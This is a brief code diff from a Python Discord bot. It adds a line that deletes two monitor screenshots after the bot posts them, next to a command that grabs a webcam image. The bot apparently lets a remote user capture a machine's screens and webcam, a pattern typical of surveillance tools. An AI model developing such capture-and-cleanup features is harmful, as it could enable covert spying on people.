@@ -103,6 +103,7 @@ async def screenshot(ctx):
 
   await ctx.respond('Monitor 1', file=picture1)
   await ctx.respond('Monitor 2', file=picture2)
+  os.remove(screen1) ; os.remove(screen2)
   
 
 @bot.slash_command(name='webcam-shot', description='Grab a shot from the webcam')
